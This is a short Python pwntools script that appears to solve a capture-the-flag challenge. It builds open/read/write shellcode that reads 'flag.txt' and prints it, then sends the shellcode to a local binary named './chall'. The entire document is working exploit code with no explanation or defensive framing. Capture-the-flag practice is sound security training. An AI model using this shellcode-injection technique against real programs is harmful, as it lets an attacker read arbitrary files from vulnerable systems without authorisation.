from pwn import *
context.binary = './chall'
context.arch = 'amd64'
io = process("./chall")
shellcode = asm(shellcraft.open('flag.txt')) + asm(shellcraft.read('rax','rsp',48)) + asm(shellcraft.write(1, 'rsp', 48))
exploit = shellcode
io.sendlineafter(b'>>',exploit)
io.interactive()